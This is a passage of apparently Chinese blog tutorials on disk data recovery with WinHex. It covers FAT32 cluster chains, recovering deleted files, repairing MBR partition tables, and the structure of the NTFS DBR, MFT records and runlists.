<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-6d2716c643c58c92.png" alt><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-015a050604c8dd77.png" alt><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-e6c8fbc304454144.png" alt="目录项.png"><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-290664d798144e0b.png" alt></p>
<p>可得文件的起始簇号=132331，文件大小=16字节<br>转到指定簇得</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-40c6a9124f1018bf.png" alt></p>
<p>可以看到文件的内容部分<br>在文件头右键选块起始，若使用十进制数据，点击左侧Offset纵栏将显示进制转化为十进制，点击Winhex上方小箭头转到偏移量，将文件大小16填入</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-dfbeea07f33f1bc3.png" alt><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-3a161c68348d67f3.png" alt></p>
<p>可得到文件的末位+1的位置，点击选块结束，即可选定数据范围</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-d0cf42a66026cb39.png" alt></p>
<p>选块右键点击<strong>编辑</strong>，复制选块至新文件，选择好位置，并输入带后缀的文件名，即可将其人工拷贝至新位置。</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-cee5bded5f6c91f4.png" alt><br><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-496e0e60d14bb3cd.png" alt></p>
<h1 id="目标2：数据恢复教程-rar"><a href="#目标2：数据恢复教程-rar" class="headerlink" title="目标2：数据恢复教程.rar"></a>目标2：数据恢复教程.rar</h1><p>此次使用的是另一块虚拟磁盘，此次文件非常多，我们尝试在根目录下进行文件名搜索<img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-2da11da797a45148.png" alt></p>
<p>发现需要很长时间，这是因为该磁盘内文件很多，根目录很大。于是我们需要用FAT表进行文件目录下一簇号的查找。</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-1c4a61787d671cf8.png" alt></p>
<p>其中Fat的第二表项标注根目录存放情况，此处第三个四字节并不是FFFFFF0F，而是410f0000(0xF41)，我们可知存放根目录的下一个簇号是0xF41<br>于是我们转到该簇号，进行进一步的文件名查找</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-7502418b06b7332c.png" alt></p>
<p>发现查找依然要很久<br>返回FAT表，查看存放根目录的下一个簇号，如何查看呢？<br>由于FAT表每四个字节记录一个簇号的使用情况，因此我们可以将FAT表偏移量设置为3905*4(0xF41*4)即可找到存放根目录的下一个簇号<br>将鼠标点击FAT表初始位置F8，点击Winhex上面转到偏移量</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-1915fc0e624cd7a5.png" alt><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-3fca51caf73a6790.png" alt></p>
<p>于是我们找到了存放根目录的下一个簇号7117，依然跳转到该簇查询文件，发现依然很慢（一时出不来），接着重复操作，在FAT表转到偏移量7117*4得到下一个簇号为10081，进行查找，无果，再在FAT表转到偏移量10081*4得到下一个簇号为13671，很快就找到了文件目录（按F3跳到下一个匹配对象）</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-22433509e3e947dd.png" alt></p>
<p>文件所在簇为0x13599（79257）文件大小为0x63（99）字节【注：字节数一定不能少，不然压缩包打开会报错】，即可将其进行提取</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-60d32ae8dfc57b6d.png" alt></p>
<p>这边我们加对FAT表的理解：<br>FAT表是描述文件簇流存放的情况，他用FAT表项以链表的形式将其文件存放情况描述出来，存放数据（包括根目录）的第一个簇是<strong>2号簇</strong>，对于第k个四字节位置，它存放的是<strong>使用第k个簇存放文件后下一个簇的位置</strong>。</p>
<h1 id="目标3：恢复删除的文件"><a href="#目标3：恢复删除的文件" class="headerlink" title="目标3：恢复删除的文件"></a>目标3：恢复删除的文件</h1><p>打开另一个新磁盘<img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-73ad6fb2a6983a0b.png" alt></p>
<p>在分区内我们发现一个被删除的文件”?INHEX.zip”，这边的<strong>?</strong>是因为被删除文件的文件名首字节会被替换成<strong>E5</strong>标记，我们分别使用Winhex自带功能恢复和人工恢复。</p>
<p>对于被删除的文件，右键点击恢复</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-d7fb35b42dbc8c0d.png" alt>这就可以很轻松恢复了。<br><br>人工恢复呢，则是采用目标1和目标2的方法进行恢复。<br>首先将WINHEX转化为ASCII码</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-3c839a1183b57143.png" alt></p>
<p>这边只取后5个字节，因为被删除文件第一个字节被标志为<strong>E5</strong><br>输入十六进制搜索框搜索，偏移量设置为1（因为E5不进行比较）</p>
<p><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-64de46afa3faf4b7.png" alt><br><img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-4914e51764829ad9.png" alt></p>
<p>查找到文件目录，即可进行恢复。</p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>磁盘显示未初始化修复</title>
    <url>/posts/58a99ce/</url>
    <content><![CDATA[<p> 本文主要介绍如何解决磁盘显示未初始化的问题。<a id="more"></a></p>
<p>首先我们在磁盘管理导入实验磁盘<br><img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-9cad2d1d4323281e.png" alt><br>可以发现磁盘2显示<strong>未分配</strong>且可能<strong>弹出未初始化</strong><br>此时我们用Winhex打开磁盘<br><img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-a9539e303de5976a.png" alt>可以发现磁盘分区有两个且均为半透明，MBR扇区为空，分区类型均为NTFS<br>先在此扇区末尾补上55AA<br><img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-81d456f02b167ca8.png" alt>再将两个分区的分区类型值补上（07）<img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-e113436358be6e3a.png" alt><br>再到每个分区的DBR扇区找到扇区地址和总扇区数<img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-bc228e0a55400b69.png" alt><img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-29f6d393c61d7d22.png" alt>回到MBR扇区填上DPT<img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-792b15090705c5f3.png" alt>点击保存，回到磁盘管理刷新磁盘即可<img src="/images/loading.gif" data-original="/posts/58a99ce/18457849-6824514044931e16.png" alt>可以看到恢复成功！</p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>深究NTFS文件系统</title>
    <url>/posts/579cc9c9/</url>
    <content><![CDATA[<p>NTFS文件系统比FAT32复杂多了，小明我上课听得一头雾水。<br>接下来来详细介绍NTFS文件系统<br>NTFS文件系统原名为New Tecnology File System（这个称呼有点直接(・∀・)），是现在绝大多数电脑磁盘分区使用的文件系统。<a id="more"></a></p>
<h1 id="NTFS介绍"><a href="#NTFS介绍" class="headerlink" title="NTFS介绍"></a>NTFS介绍</h1><p>其具有以下特点：<br>–<strong>安全性较高</strong>，NTFS文件系统有日志容错功能，所以安全性比FAT文件系统高。<br>–NTFS文件系统可以<strong>给文件设置访问权限</strong><br>–文件<strong>压缩</strong>和文件<strong>加密</strong>（<strong>EFS加密</strong>右键高级设置）<br>–<strong>磁盘配额</strong><br>–NTFS文件系统<strong>支持大分区</strong>（在MBR磁盘最大支持<strong>2T</strong> ，在GPT磁盘支持的分区更大）<br>–NTFS文件系统<strong>支持大文件</strong>（<strong>大于4G</strong>）<br>–NTFS下可创建超过<strong>2TB</strong>的磁盘（注：<strong>硬盘可创建超过其本身大小的虚拟磁盘</strong>，但是需要选择<strong>动态扩展</strong>而不是固定大小。其文件类型是<strong>vhdx</strong>。）</p>
<p>接下来演示以下NTFS文件的压缩功能（文件系统本身支持的，不借助压缩软件）<br>右键属性，点击常规中的高级，勾上<strong>压缩内容以便节省磁盘空间</strong><br><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-9a397e0c0b67a24c.png" alt>点击确定即可<br><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-3cc2aebe432303fe.png" alt><br>可以发现文件占用空间变小了，且其属性图标发生了变化，多了两个小箭头<img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-07b65dbc0c933f83.png" alt>文件图标均发生变化，NTFS压缩是<strong>透明的</strong>，即外部程序可以直接访问压缩后的文件，而其他压缩软件，是不透明的，外部程序无法直接访问，需要解压后才可以访问，但是NTFS压缩相对来说比压缩软件压缩得比较<strong>少</strong>。</p>
<h1 id="NTFS的结构类型"><a href="#NTFS的结构类型" class="headerlink" title="NTFS的结构类型"></a>NTFS的结构类型</h1><p>结构类型有两种<img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-6b9a95153660411f.png" alt="NTFS结构类型1"><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-042a647d1d1e8363.png" alt="NTFS结构类型2"><br>可以注意到分区末尾均有<strong>备份DBR</strong>。</p>
<h1 id="NTFS的DBR扇区"><a href="#NTFS的DBR扇区" class="headerlink" title="NTFS的DBR扇区"></a>NTFS的DBR扇区</h1><p><strong>查找NTFS DBR快速方法:十六进制查找EB5290</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-c86afd628efa47da.png" alt="NTFS的DBR扇区"><br><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-863c873e44854b48.png" alt="DBR的数据结构"></p>
<p>介绍一下一些特殊概念：</p>
<p>1）<strong>15</strong>是代表<strong>介质描述符</strong>，<strong>F8</strong>代表<strong>硬盘介质</strong></p>
<p>2）<strong>1C-1F</strong>代表<strong>隐含扇区数</strong>，是针对于主分区而言的隐含扇区，隐含扇区是NTFS分区前的物理扇区数，如果NTFS分区是在磁盘内，则和该扇区在磁盘位置数值一样，如NTFS分区是在扩展分区内，则是表示在该分区内<strong>相对偏移</strong>扇区。</p>
<p>3）<strong>28-2F</strong>是<strong>文件系统扇区总数</strong>，其是8个字节，要用数据解析器的<strong>64bit位</strong>查看，其与NTFS实际扇区数<strong>可能有出入</strong>（NTFS的一种特点），但是硬盘的DPT（分区表项）写的分区总扇区数与其相同。</p>
<p>4）<strong>30-37</strong>表示<strong>MFT起始簇号</strong>，MFT是NTFS的第0个元文件，<strong>38-3F</strong>表示MFTMirr的<strong>起始簇号</strong>,它是NFTS的第1个元文件，是MFT的镜像，紧跟在MFT后面，40是<strong>MFT项的大小</strong>，即其所占用的空间，一般是<strong>2个扇区</strong>（计算方法，选中40（数值为0xF6）查看数据解释器8 bit(±)为-10，利用公式$2^{-1*-10}=2^{10}=2$个扇区）。</p>
<p>5）<strong>44</strong>表示<strong>每个索引块大小簇数**</strong>（待补充）**</p>
<h1 id="NTFS文件系统的16个元文件"><a href="#NTFS文件系统的16个元文件" class="headerlink" title="NTFS文件系统的16个元文件"></a>NTFS文件系统的16个元文件</h1><p>这些元文件名都是以<strong>\$</strong>开头的<img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-04b201371d0d26e2.png" alt><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-7e735c56d1f5d3f4.png" alt></p>
<p>值得注意的是，<strong>元文件文件名和序号是严格对应</strong>，在NTFS分区内按序号排列。</p>
<p>我们可以通过DBR扇区的\$MFT起始簇号或者直接点击\$MFT跳转到MFT元文件。</p>
<p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-2295ea2d28343976.png" alt></p>
<p>可以看到\$MFT字样，向下多次滑可以依次看到<br>\$MFTMir、\$LogFile、\$Volume(当我们卷标显示时，要用unicode编码（点击Winhex查看字符集选择unicode可以看到“新加卷”字样，因为<strong>NTFS是用Unicode编码，FAT32是用ASCII编码</strong>)、\$AttrDef等，但是\$Root是不可见的。</p>
<h1 id="MFT表"><a href="#MFT表" class="headerlink" title="MFT表"></a>MFT表</h1><p><strong>MFT表特点</strong></p>
<ul>
<li><p>以明文<strong>“FILE”</strong>开头</p>
</li>
<li><p>每个MFT项都占用<strong>1024</strong>字节，即<strong>两个扇区</strong></p>
</li>
<li><p>NTFS文件系统中的所有文件，都有一个MFT项记录相应的数据</p>
</li>
<li><p>每个MFT项占用的两个扇区，<strong>最后两个字节</strong>是一个修正值，这个修正值和MFT项中的<strong>更新序列号</strong>相同，如果系统发现<strong>不同</strong>，就会认为这个MFT项<strong>错误</strong>，会把开头标志明文“FILE”改成<strong>“BAAD”</strong></p>
</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-ea56790dd30790f5.png" alt></p>
<p>可以发现它是有颜色区分的！<strong>不同颜色块代表不同的属性</strong></p>
<h2 id="NTFS主文件分配表-MFT头"><a href="#NTFS主文件分配表-MFT头" class="headerlink" title="NTFS主文件分配表(MFT头)"></a>NTFS主文件分配表(MFT头)</h2><p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-b627108f7f0cc0b7.png" alt></p>
<h2 id="MFT头的数据结构"><a href="#MFT头的数据结构" class="headerlink" title="MFT头的数据结构"></a>MFT头的数据结构</h2><p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-9a6c6aecba0240fb.png" alt><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-fe140369ee885b30.png" alt></p>
<p>1）这边重点提一下<strong>04-05 06-07</strong>指<strong>更新序列号的偏移和个数</strong>，一般来说，04-05是30 00（其实是0x0030），则由偏移找到MFT头的30位置，看到04 00，这个就是更新序列号，06-07是指更新序列号的个数，一个MFT表一般有3个更新序列号，分别位于<strong>30、第一个扇区末尾，第二个扇区末尾</strong>，如下图</p>
<p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-74bc8f8dae201cdc.png" alt><strong>如果系统发现这几个更新序列号不同，就会认为这个MFT项错误，会把开头标志明文“FILE”改成“BAAD”</strong></p>
<p>2）<strong>14-15</strong>代表<strong>第一个属性的偏移地址</strong>，图上写的是0x0038，转向38块，可以发现这是10属性的开头。</p>
<p>3）<strong>16-17</strong>代表着<strong>文件或目录的状态</strong>，<strong>00：文件被删除，01：文件正常，02：目录被删除，03：目录正常</strong></p>
<p>4）<strong>18-1B</strong>、<strong>1C-1F</strong>分别代表MFT项的<strong>逻辑长度（有效长度 ）</strong>和<strong>物理长度（占用长度）</strong>，单位是<strong>字节</strong>，可以看到图中物理长度是0x00 00 04 00字节=1024字节=2个扇区。</p>
<p>5）<strong>2C-2F</strong>代表<strong>MFT项的索引号**</strong>（待补充）**</p>
<h2 id="MFT属性"><a href="#MFT属性" class="headerlink" title="MFT属性"></a>MFT属性</h2><p>每个MFT的属性都可以分成两部分：<strong>属性头</strong>和<strong>属性体</strong></p>
<p>MFT属性的分类:</p>
<ul>
<li><strong>常驻属性</strong>：直接在<strong>MFT项中</strong>记录属性体，例如10 30<ul>
<li>优点：直接在MFT项中记录属体，访问速度<strong>快</strong></li>
<li>缺点：只能记录<strong>少量</strong>的数据</li>
</ul>
</li>
<li><strong>非常驻属性</strong>：在<strong>MFT之外</strong>的区域记录属性体，例如80<ul>
<li>优点：用簇流记录文件存储的数据区域，可以记录很<strong>大</strong>的数据</li>
<li>缺点：访问速度较<strong>慢</strong></li>
</ul>
</li>
</ul>
<p><strong>属性类型</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-4f7bf1aaa733a70d.png" alt><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-981ce1374bc402e1.png" alt><br>一个属性分为<strong>属性头</strong>和<strong>属性体</strong>，<strong>用同一种颜色的浅深区分</strong></p>
<h3 id="常驻属性的数据结构"><a href="#常驻属性的数据结构" class="headerlink" title="常驻属性的数据结构"></a>常驻属性的数据结构</h3><p><strong>常驻属性的属性头</strong><br><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-6b31c1f17f2a23d0.png" alt="常驻属性的属性头"><br><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-ffff50d825b4fbab.png" alt></p>
<p>其中注意以下几点：<br>1）<strong>00-03</strong>是指<strong>属性类型</strong></p>
<p>2）<strong>04-07</strong>是指<strong>整个属性的总字节数</strong></p>
<p>3）<strong>08</strong>代表<strong>属性类型</strong>（<strong>0常驻 or 1非常驻</strong>）</p>
<p>4）<strong>10-13</strong>代表<strong>属性体的字节数</strong>（与实际颜色块字节数可能不同，因为颜色块是8字节为一块划分的）</p>
<p>5）<strong>14-15</strong>代表<strong>属性体偏移的字节数</strong>，是相对于属性头开头位置的偏移量，亦即代表<strong>属性头的字节数</strong></p>
<h4 id="MFT中10属性体"><a href="#MFT中10属性体" class="headerlink" title="MFT中10属性体"></a>MFT中10属性体</h4><p><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-6b31c1f17f2a23d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10属性"><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-82c5a354f7e9fe2a.jpg" alt="10属性体"></p>
<h4 id="MFT中30属性体"><a href="#MFT中30属性体" class="headerlink" title="MFT中30属性体"></a>MFT中30属性体</h4><p>MFT中30属性，最小为\x68（104）字节，最大为\x268（616）字节，可容纳<strong>255</strong>个<strong>Unicode</strong>字符的文件名<br><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-1bc5b85129e5f265.png" alt="30属性"><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-dcb82694859880bf.jpg" alt><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-8cfa26ccc068563d.jpg" alt="30属性体"></p>
<p>其中<br>38-3B：<strong>类型依照加法原则</strong><br>40：文件名的长度为一个字节，因此文件名最大长度为FFh=255字节<br>41：文件命名类型 有 00 01 02 03</p>
<h3 id="非常驻属性的数据结构"><a href="#非常驻属性的数据结构" class="headerlink" title="非常驻属性的数据结构"></a>非常驻属性的数据结构</h3><p><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-3f373854254a202b.png" alt><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-c2eff230fa120dfc.png" alt><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-baa15cce6d05acd1.png" alt></p>
<p>其中<strong>28-2F</strong>是<strong>属性体占用总空</strong>（<strong>字节数</strong>），亦即<strong>数据总大小</strong></p>
<h4 id="80属性"><a href="#80属性" class="headerlink" title="80属性"></a>80属性</h4><p>80属性是存储文件数据内容。</p>
<p>80属性有两种类型，一种是常驻80属性，一种是非常驻80属性。</p>
<p><strong>常驻属性头比较小，体比较大；<br>非常驻属性头比较大，体比较小。</strong></p>
<p>这在winhex很容易辨认。</p>
<p>当文件大小<strong>不超过1024字节（一个扇区）</strong>是在一个簇里存，此时80属性为常驻属性；<br>当文件<strong>大于1024字节</strong>会变成簇流（非常驻）存储方式。<br><strong>常驻80属性的属性体就是数据内容，可用winhex直接复制到新文件显示。</strong><br><strong>非常驻的属性体是簇流存储地址</strong>。</p>
<p>LCN(logical cluster number)：整个文件卷的相对位置，单位(簇)。<br>VCN(virtual cluster number)：文件内部的相对位置，单位(簇)。</p>
<p>每个运行列表中第一个字节的低4位表示运行簇大小（filesize）的len，高4位表示起始簇（start）的len。如果一个运行列表后面的第一个字节是00，说明运行列表结束，后面的数值暂时不用管；如果不是00，则是下一个运行列表开始。</p>
<h5 id="①常驻"><a href="#①常驻" class="headerlink" title="①常驻"></a>①常驻</h5><p><img src="/images/loading.gif" data-original="/posts/579cc9c9/14508631-11621272c6efc0bd.png" alt="image"><br><img src="/images/loading.gif" data-original="/posts/579cc9c9/18457849-542754aa8eb35476.png" alt></p>
<h5 id="②非常驻—-gt-一个运行列表"><a href="#②非常驻—-gt-一个运行列表" class="headerlink" title="②非常驻—&gt;一个运行列表"></a>②非常驻—&gt;一个运行列表</h5><p><img src="/images/loading.gif" data-original="/posts/579cc9c9/14508631-dd27efa0b29c1fee.png" alt="非常驻--&gt;一个运行列表"></p>
<p>0x00~0x3F 是属性头；运行列表在橘黄色框中，0x40开始，可以得到运行列表 33 40 BC 00 00 00 0C。</p>
<p>分析如下:<br>首先0x33，低4位是3，表示紧随其后的3Byte 0xBC40作为<strong>运行簇大小（簇个数）</strong>，即文件所占总大小；高4位是3，表示簇大小之后的3个Byte 0x0C0000 是<strong>起始簇</strong>，即文件起始，这里是说的是LCN。<br><strong>划重点！！！</strong><br><strong>通过该处簇总个数与28-2F的属性体占用总空间大小，可推算出一个簇的大小。</strong></p>
<p>公式为<br><strong>NTFS中一个簇包含的扇区=  (数据总大小(字节)/512)/簇总个数</strong></p>
<h5 id="③非常驻—-gt-多个运行列表"><a href="#③非常驻—-gt-多个运行列表" class="headerlink" title="③非常驻—&gt;多个运行列表"></a>③非常驻—&gt;多个运行列表</h5><p><img src="/images/loading.gif" data-original="/posts/579cc9c9/14508631-fb99bb4de13afb72.png" alt="非常驻--&gt;多个运行列表"></p>
<p>分析如下：</p>
<p>第一个运行列表，首先是0x31，低4位是1，表示紧接着的1Byte(03)是运行簇大小；高4位是3，表示紧接着3Byte(65 9A 00)是起始簇，这里说的是LCN；</p>
<p>第二个运行列表，首先是0x11，低4位是1，表示紧接着的1Byte(01)是运行簇大小；高4位是1，表示紧接着3Byte(13)是起始簇，这里说的是VCN。</p>
<p>注意，只有第一个运行列表的起始簇说的是LCN，从第二个运行列表开始每个运行列表的起始簇都说的是VCN。想要得到LCN需要按下面的公式计算：</p>
<p><strong>第n个运行列表的LCN = 第一个运行列表的起始簇(LCN) + 第二个运行列表的起始簇(VCN) +…+第n个运行列表的起始簇(VCN)</strong></p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>数据恢复之磁盘分区删除恢复</title>
    <url>/posts/94961d67/</url>
    <content><![CDATA[<p>今入门电子数据恢复，磁盘使用的分区类型是<strong>MBR</strong>（<em>现大多数电脑的C盘和D盘使用的分区类型是</em> <strong>GPT</strong>  <em>，请勿用以下方法对其进行尝试，应该用使用MBR分区类型的磁盘进行操作</em>）,载入实验磁盘，右键此电脑打开管理中的磁盘管理，可看到加载入的磁盘2分成两个分区。<a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-5754895848a9e7e1.png" alt>接下来将磁盘分区删除，新加卷右键点击删除</p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-29510eab831db2f7.png" alt>得到效果如下</p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-484b615047a55546.png" alt>糟糕，有重要文件呢，怎么办呀Σ(っ °Д °;)っ<br>别担心，恢复很简单！<br>前提是<strong>一定不能</strong>对这个磁盘做<strong>新建简单卷</strong>等其他会对磁盘进行写入或格式化的操作（在NTFS下格式化很多时候是无法恢复格式化前的数据的，FAT32则不然）</p>
<p>这里先熟悉NTFS文件系统，其<strong>安全性高，可使用EFS加密</strong>，是现在绝大多数电脑磁盘分区使用的文件系统，因此我们恢复磁盘时，首先明确其是使用<strong>NTFS文件系统</strong>的磁盘。<br><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-2ec431e721b1be3e.png" alt>对于NTFS分区的DBR，我们只看前5行，此次恢复只需要使用<strong>文件系统总扇区数</strong>这个属性。</p>
<p>首先，用<strong>Winhex</strong>打开磁盘2<img src="/images/loading.gif" data-original="/posts/94961d67/18457849-9b67b4378471c867.png" alt></p>
<p>可以看到两个分区图标是灰色的，分区表全为00，说明磁盘有损坏，但是也说明分区并未真正消失，于是我们对分区表进行修复即可。</p>
<p>先熟悉<strong>分区表项</strong>属性<br><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-1458be69eed3151d.png" alt></p>
<p>恢复分区关键在于分区正确填充<strong>分区类型值</strong>、<strong>分区起始扇区</strong>、<strong>分区总扇区数</strong>。<br>接下来我们查找第一个NTFS DBR扇区位置，十六进制查找输入<strong>55AA</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-de486c0faab0b652.png" alt><br>PS：<strong>此处512=510表示是每512字节（一个扇区）忽略前510字节，只比较后两个字节进行查找</strong></p>
<p>很快我们找到了第一个扇区<br><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-1ff076a7678868e0.png" alt><br>然后记下此DBR扇区位置：<strong>2048</strong> 总扇区数：<strong>47558655</strong></p>
<p>接下来继续查找下一个MBR扇区位置，我们发现，即使做了优化，用十六进制查找还是非常的慢，这是因为第二个分区太大了，此时我们可以直接跳转查看，跳到2048+47558655<strong>+1</strong>（<strong>一定要+1</strong>，后面会说明原因，这是NTFS和FAT的区别之一）扇区，可以发现找到了第二个NTFS DBR扇区<br><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-53dc299ea40c3687.png" alt><br>记录下第二个DBR扇区位置：<strong>47560704</strong> 总扇区数：<strong>441071615</strong></p>
<p>实际上，我们也可以通过逆向查找DBR扇区，将滑动条移到扇区末尾，<strong>向上</strong>查找<strong>55AA</strong><br><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-48fd58ec963404e2.png" alt></p>
<p>也是同样可以找到的。<br>其实还有一种最简单的方法：直接点击分区就可以跳到相应分区的DBR扇区位置啦。</p>
<p>接下来填分区表，这边填数据有个技巧。</p>
<p><strong>先选中数据区域，往数据解释器填入相应bit位的数值</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-44f6276606ddf2c5.png" alt>再按<strong>回车</strong>即可填充十六进制数据</p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-0999cfd059b23a42.png" alt>填完后效果如下</p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-87e4f6d7babdd812.png" alt><br>最后，千万要记得加分区表的<strong>分区类型值</strong>！！！<br>在两个分区表项的第<strong>五</strong>个字节都填入<strong>07</strong>（代表NTFS分区）</p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-aa2d7b977b7df206.png" alt></p>
<p>点击左上角<strong>保存</strong>按钮<br>进入磁盘管理，<strong>刷新磁盘管理</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-9c719df0b9164470.png" alt></p>
<p>发现一个问题，第二个扇区未成功恢复，这是什么原因呢？</p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-6b9a95153660411f.png" alt="NTFS结构类型1"><br><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-042a647d1d1e8363.png" alt="NTFS结构类型2"></p>
<p>原来，第二个扇区边有两个一样的DBR扇区，其中一个是和第一个DBR扇区是一样的（<strong>NTFS分区末尾会有一个备份DBR，但这个扇区并没有被计入总扇区数，有时候ntfs的总扇区数可能会少好几个扇区，因此直接用扇区位置+扇区总数计算下一个DBR位置时要注意跳转到的下一个DBR扇区是否是正确的，一般要向下浮动观察</strong>），填扇区时误填47560703，此时只要将第二个扇区位置改为47560703+1=47560704即可。</p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-291badd017eeae07.png" alt></p>
<p>再次<strong>保存</strong>，<strong>刷新磁盘管理</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/94961d67/18457849-3fe493d5b3bd93d8.png" alt></p>
<p>恢复成功！</p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>深究FAT32文件系统</title>
    <url>/posts/53072925/</url>
    <content><![CDATA[<p>FAT（文件分配表）文件系统是Windows操作系统所使用的一种文件系统，它的发展过程经历了FAT12  FAT16 FAT32三个阶段。<a id="more"></a></p>
<h1 id="FAT文件系统"><a href="#FAT文件系统" class="headerlink" title="FAT文件系统"></a>FAT文件系统</h1><p>FAT文件系统用“<strong>簇</strong>”作为数据单元，一个“簇”由一组连续的扇区组成，簇所含的扇区数必须是<strong>2的整数次幂</strong>。簇的最大值为64个扇区，即32KB。所有簇从<strong>2</strong>开始进行编号，每个簇都有一个自己的地址编号。用户文件和目录都存储在簇中。FAT文件系统的数据结构中有两个重要的结构：文件分配表和目录项。</p>
<p>文件和文件夹内容存储在簇中，如果一个文件或文件夹需要多余一个簇的空间，则用FAT表来描述如何找到另外的簇。FAT结构用于指出文件的下一个簇，同时也说明了簇的分配状态，FAT12  FAT16  FAT32这三种文件系统之间的主要区别在于与FAT项的大小不同。</p>
<p>FAT文件系统的每一个文件和文件夹都被分配到一个目录项，目录项中记录中文件名，大小，文件内容起始地址以及其他一些元数据。</p>
<p>在FAT文件系统中，文件系统的数据记录在“<strong>引导扇区中（DBR）</strong>”中，引导扇区位于整个文件系统的<strong>0号扇区</strong>，是文件系统隐藏区域（也称为保留区）的一部分，我们称其为DBR（DOS引导记录）扇区，DBR中记录着文件系统的起始位置，大小，FAT表个数以及大小等相关信息。在FAT文件系统中，同时使用“<strong>扇区地址</strong>”和“<strong>簇地址</strong>”两种地址管理方式，这是因为只有存储用户数据的数据区使用簇进行管理（FAT12 FAT16的根目录除外），所有簇都位于数据区，其他文件系统管理数据区域是不以簇进行管理的，这部分区域使用扇区地址进行管理。文件系统的起始扇区为<strong>0号扇区。</strong></p>
